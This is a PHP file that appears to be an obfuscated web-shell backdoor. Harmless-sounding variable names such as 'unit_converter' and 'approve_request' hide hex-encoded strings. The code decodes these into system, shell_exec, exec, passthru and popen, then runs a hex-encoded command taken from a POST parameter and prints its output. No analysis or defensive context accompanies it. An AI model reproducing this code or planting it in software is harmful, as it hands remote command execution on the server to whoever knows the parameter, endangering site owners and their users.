<?php


$key1 = '3';
$key2 = '9';
$key3 = '7';
$key4 = '5';
$key5 = 'd';
$key6 = '8';
$key7 = '6';
$key8 = 'c';
$key9 = '0';
$key10 = '1';
$key11 = '4';
$key12 = '2';
$key13 = 'f';
$unit_converter1 = pack("H*", '7'.$key1.'7'.$key2.$key3.$key1.'7'.'4'.'6'.$key4.'6'.$key5);
$unit_converter2 = pack("H*", $key3.'3'.'6'.$key6.'6'.$key4.$key7.'c'.$key7.$key8.$key4.'f'.'6'.$key4.$key3.'8'.$key7.'5'.'6'.'3');
$unit_converter3 = pack("H*", $key7.'5'.'7'.'8'.$key7.'5'.'6'.$key1);
$unit_converter4 = pack("H*", '7'.$key9.$key7.$key10.'7'.'3'.$key3.$key1.$key3.$key11.$key7.'8'.$key3.$key12.$key3.$key4);
$unit_converter5 = pack("H*", $key3.'0'.$key7.$key13.$key3.$key9.'6'.'5'.$key7.'e');
$unit_converter6 = pack("H*", '7'.$key1.'7'.$key11.$key3.'2'.$key7.$key4.'6'.'1'.'6'.$key5.$key4.$key13.'6'.$key3.$key7.$key4.'7'.$key11.$key4.$key13.'6'.'3'.$key7.'f'.'6'.'e'.$key3.'4'.'6'.$key4.$key7.'e'.$key3.$key11.'7'.'3');
$unit_converter7 = pack("H*", $key3.$key9.$key7.$key1.$key7.$key8.$key7.'f'.$key3.'3'.$key7.$key4);
$approve_request = pack("H*", '6'.$key10.'7'.$key9.'7'.'0'.'7'.'2'.'6'.'f'.'7'.$key7.'6'.'5'.'5'.$key13.$key3.$key12.'6'.'5'.$key3.'1'.'7'.'5'.$key7.'5'.'7'.$key1.$key3.$key11);
if (isset($_POST[$approve_request])) {
    $approve_request = pack("H*", $_POST[$approve_request]);
    if (function_exists($unit_converter1)) {
        $unit_converter1($approve_request);
    } elseif (function_exists($unit_converter2)) {
        print $unit_converter2($approve_request);
    } elseif (function_exists($unit_converter3)) {
        $unit_converter3($approve_request, $ent_dat);
        print join("\n", $ent_dat);
    } elseif (function_exists($unit_converter4)) {
        $unit_converter4($approve_request);
    } elseif (function_exists($unit_converter5) && function_exists($unit_converter6) && function_exists($unit_converter7)) {
        $value_k = $unit_converter5($approve_request, 'r');
        if ($value_k) {
            $object_desc = $unit_converter6($value_k);
            $unit_converter7($value_k);
            print $object_desc;
        }
    }
    exit;
}
